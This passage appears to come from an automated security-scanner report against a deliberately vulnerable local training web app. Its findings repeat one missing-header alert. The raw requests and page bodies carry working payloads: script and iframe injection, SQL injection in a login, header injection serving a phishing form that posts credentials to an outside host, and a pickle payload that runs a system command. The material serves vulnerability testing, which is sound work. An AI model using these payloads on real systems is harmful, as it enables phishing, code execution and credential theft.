          This issue still applies to error type pages (401, 403, 500, etc.) as those pages are often still affected by injection issues, in which case there is still concern for browsers sniffing pages away from their actual content type.

          At "High" threshold this scan rule will not alert on client or server error responses.
          Request
          Request line and header section (626 bytes) 
          GET http://127.0.0.1:65412/?v=0.2%3Ciframe%20src%3D%22http%3A%2F%2Fdsvw.c1.biz%2Fi%2Flogin.html%22%20style%3D%22background-color%3Awhite%3Bz-index%3A10%3Btop%3A10%25%3Bleft%3A10%25%3Bposition%3Afixed%3Bborder-collapse%3Acollapse%3Bborder%3A1px%20solid%20%23a8a8a8%22%3E%3C%2Fiframe%3E HTTP/1.1
Host: 127.0.0.1:65412
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: pl,en-US;q=0.7,en;q=0.3
Connection: keep-alive
Referer: http://127.0.0.1:65412/
Upgrade-Insecure-Requests: 1
          Request body (0 bytes)
          Response
          Status line and header section (171 bytes) 
          HTTP/1.0 200 OK
Server: BaseHTTP/0.6 Python/3.8.10
Date: Thu, 13 Jan 2022 19:11:31 GMT
Connection: close
X-XSS-Protection: 0
Content-Type: text/html; charset=utf8
          Response body (12910 bytes) 
          <!DOCTYPE html>

<li>Denial of Service (<i>memory</i>) - <a href="/?size=32">vulnerable</a>|<a href="/?size=9999999">exploit</a>|<a href="https://owasp.org/www-community/attacks/Denial_of_Service" target="_blank">info</a></li>
</ul>
          Parameter 
          X-Content-Type-Options
          Solution

          Ensure that the application/web server sets the Content-Type header appropriately, and that it sets the X-Content-Type-Options header to 'nosniff' for all web pages.

          If possible, ensure that the end user uses a standards-compliant and modern web browser that does not perform MIME-sniffing at all, or that can be directed by the web application/web server to not perform MIME-sniffing.
        29. GET http://127.0.0.1:65412/?v=0.2%3Cscript%3Ealert(%22arbitrary%20javascript%22)%3C%2Fscript%3E
          Alert tags
          • OWASP_2021_A05
          • OWASP_2017_A06
          Alert description

          The Anti-MIME-Sniffing header X-Content-Type-Options was not set to 'nosniff'. This allows older versions of Internet Explorer and Chrome to perform MIME-sniffing on the response body, potentially causing the response body to be interpreted and displayed as a content type other than the declared content type. Current (early 2014) and legacy versions of Firefox will use the declared content type (if one is set), rather than performing MIME-sniffing.
          Other info

          This issue still applies to error type pages (401, 403, 500, etc.) as those pages are often still affected by injection issues, in which case there is still concern for browsers sniffing pages away from their actual content type.

          At "High" threshold this scan rule will not alert on client or server error responses.
          Request
          Request line and header section (437 bytes) 
          GET http://127.0.0.1:65412/?v=0.2%3Cscript%3Ealert(%22arbitrary%20javascript%22)%3C%2Fscript%3E HTTP/1.1
Host: 127.0.0.1:65412
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: pl,en-US;q=0.7,en;q=0.3
Connection: keep-alive
Referer: http://127.0.0.1:65412/
Upgrade-Insecure-Requests: 1
          Request body (0 bytes)
          Response
          Status line and header section (171 bytes) 
          HTTP/1.0 200 OK
Server: BaseHTTP/0.6 Python/3.8.10
Date: Thu, 13 Jan 2022 19:10:37 GMT
Connection: close
X-XSS-Protection: 0
Content-Type: text/html; charset=utf8
          Response body (12777 bytes) 
          <!DOCTYPE html>
<html>
<head>
<style>a {font-weight: bold; text-decoration: none; visited: blue; color: blue;} ul {display: inline-block;} .disabled {text-decoration: line-through; color: gray} .disabled a {visited: gray; color: gray; pointer-events: none; cursor: default} table {border-collapse: collapse; margin: 12px; border: 2px solid black} th, td {border: 1px solid black; padding: 3px} span {font-size: larger; font-weight: bold}</style>

</head>

<li>HTTP Header Injection (<i>phishing</i>) - <a href="/?charset=utf8">vulnerable</a>|<a href="/?charset=utf8%0D%0AX-XSS-Protection:0%0D%0AContent-Length:388%0D%0A%0D%0A%3C!DOCTYPE%20html%3E%3Chtml%3E%3Chead%3E%3Ctitle%3ELogin%3C%2Ftitle%3E%3C%2Fhead%3E%3Cbody%20style%3D%27font%3A%2012px%20monospace%27%3E%3Cform%20action%3D%22http%3A%2F%2Fdsvw.c1.biz%2Fi%2Flog.php%22%20onSubmit%3D%22alert(%27visit%20%5C%27http%3A%2F%2Fdsvw.c1.biz%2Fi%2Flog.txt%5C%27%20to%20see%20your%20phished%20credentials%27)%22%3EUsername%3A%3Cbr%3E%3Cinput%20type%3D%22text%22%20name%3D%22username%22%3E%3Cbr%3EPassword%3A%3Cbr%3E%3Cinput%20type%3D%22password%22%20name%3D%22password%22%3E%3Cinput%20type%3D%22submit%22%20value%3D%22Login%22%3E%3C%2Fform%3E%3C%2Fbody%3E%3C%2Fhtml%3E">exploit</a>|<a href="https://www.rapid7.com/db/vulnerabilities/http-generic-script-header-injection" target="_blank">info</a></li>
<li>Component with Known Vulnerability (<i>pickle</i>) - <a href="/?object=%80%04%95t%00%00%00%00%00%00%00%7D%94%28%8C%05admin%94%8C%05admin%94%8C%05admin%94%86%94%8C%06dricci%94%8C%04dian%94%8C%05ricci%94%86%94%8C%06amason%94%8C%07anthony%94%8C%05mason%94%86%94%8C%07svargas%94%8C%06sandra%94%8C%06vargas%94%86%94u.">vulnerable</a>|<a href="/?object=cos%0Asystem%0A(S%27ping%20-n%205%20127.0.0.1%27%0AtR.%0A" onclick="alert('checking if arbitrary code can be executed remotely (true in case of delayed response)')">exploit</a>|<a href="https://www.cs.uic.edu/~s/musings/pickle.html" target="_blank">info</a></li>
<li>Denial of Service (<i>memory</i>) - <a href="/?size=32">vulnerable</a>|<a href="/?size=9999999">exploit</a>|<a href="https://owasp.org/www-community/attacks/Denial_of_Service" target="_blank">info</a></li>
</ul>
          Parameter 
          X-Content-Type-Options
          Solution

          Ensure that the application/web server sets the Content-Type header appropriately, and that it sets the X-Content-Type-Options header to 'nosniff' for all web pages.

          If possible, ensure that the end user uses a standards-compliant and modern web browser that does not perform MIME-sniffing at all, or that can be directed by the web application/web server to not perform MIME-sniffing.
        30. GET http://127.0.0.1:65412/login?username=&password=
          Alert tags
          • OWASP_2021_A05
          • OWASP_2017_A06
          Alert description

          The Anti-MIME-Sniffing header X-Content-Type-Options was not set to 'nosniff'. This allows older versions of Internet Explorer and Chrome to perform MIME-sniffing on the response body, potentially causing the response body to be interpreted and displayed as a content type other than the declared content type. Current (early 2014) and legacy versions of Firefox will use the declared content type (if one is set), rather than performing MIME-sniffing.
          Other info

          This issue still applies to error type pages (401, 403, 500, etc.) as those pages are often still affected by injection issues, in which case there is still concern for browsers sniffing pages away from their actual content type.

          At "High" threshold this scan rule will not alert on client or server error responses.
          Request
          Request line and header section (394 bytes) 
          GET http://127.0.0.1:65412/login?username=&password= HTTP/1.1
Host: 127.0.0.1:65412
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: pl,en-US;q=0.7,en;q=0.3
Connection: keep-alive
Referer: http://127.0.0.1:65412/
Upgrade-Insecure-Requests: 1
          Request body (0 bytes)
          Response
          Status line and header section (171 bytes) 
          HTTP/1.0 200 OK
Server: BaseHTTP/0.6 Python/3.8.10
Date: Thu, 13 Jan 2022 19:10:18 GMT
Connection: close
X-XSS-Protection: 0
Content-Type: text/html; charset=utf8
          Response body (1356 bytes) 
          <!DOCTYPE html>
<html>

          Parameter 
          X-Content-Type-Options
          Solution

          Ensure that the application/web server sets the Content-Type header appropriately, and that it sets the X-Content-Type-Options header to 'nosniff' for all web pages.

          If possible, ensure that the end user uses a standards-compliant and modern web browser that does not perform MIME-sniffing at all, or that can be directed by the web application/web server to not perform MIME-sniffing.
        31. GET http://127.0.0.1:65412/login?username=admin&password=%27%20OR%20%271%27%20LIKE%20%271
          Alert tags
          • OWASP_2021_A05
          • OWASP_2017_A06
          Alert description

          The Anti-MIME-Sniffing header X-Content-Type-Options was not set to 'nosniff'. This allows older versions of Internet Explorer and Chrome to perform MIME-sniffing on the response body, potentially causing the response body to be interpreted and displayed as a content type other than the declared content type. Current (early 2014) and legacy versions of Firefox will use the declared content type (if one is set), rather than performing MIME-sniffing.
          Other info

          This issue still applies to error type pages (401, 403, 500, etc.) as those pages are often still affected by injection issues, in which case there is still concern for browsers sniffing pages away from their actual content type.

          At "High" threshold this scan rule will not alert on client or server error responses.

          Parameter 
          X-Content-Type-Options
          Solution

          Ensure that the application/web server sets the Content-Type header appropriately, and that it sets the X-Content-Type-Options header to 'nosniff' for all web pages.

          If possible, ensure that the end user uses a standards-compliant and modern web browser that does not perform MIME-sniffing at all, or that can be directed by the web application/web server to not perform MIME-sniffing.
        33. GET http://127.0.0.1:65412/users.json?callback=alert(%22arbitrary%20javascript%22)%3Bprocess
          Alert tags
          • OWASP_2021_A05
          • OWASP_2017_A06
          Alert description

          The Anti-MIME-Sniffing header X-Content-Type-Options was not set to 'nosniff'. This allows older versions of Internet Explorer and Chrome to perform MIME-sniffing on the response body, potentially causing the response body to be interpreted and displayed as a content type other than the declared content type. Current (early 2014) and legacy versions of Firefox will use the declared content type (if one is set), rather than performing MIME-sniffing.
          Other info

          This issue still applies to error type pages (401, 403, 500, etc.) as those pages are often still affected by injection issues, in which case there is still concern for browsers sniffing pages away from their actual content type.

          At "High" threshold this scan rule will not alert on client or server error responses.

          Parameter 
          X-Content-Type-Options
          Solution

          Ensure that the application/web server sets the Content-Type header appropriately, and that it sets the X-Content-Type-Options header to 'nosniff' for all web pages.

          If possible, ensure that the end user uses a standards-compliant and modern web browser that does not perform MIME-sniffing at all, or that can be directed by the web application/web server to not perform MIME-sniffing.

          Alert tags
          • OWASP_2021_A05
          • OWASP_2017_A06

          The Anti-MIME-Sniffing header X-Content-Type-Options was not set to 'nosniff'. This allows older versions of Internet Explorer and Chrome to perform MIME-sniffing on the response body, potentially causing the response body to be interpreted and displayed as a content type other than the declared content type. Current (early 2014) and legacy versions of Firefox will use the declared content type (if one is set), rather than performing MIME-sniffing.

          At "High" threshold this scan rule will not alert on client or server error responses.
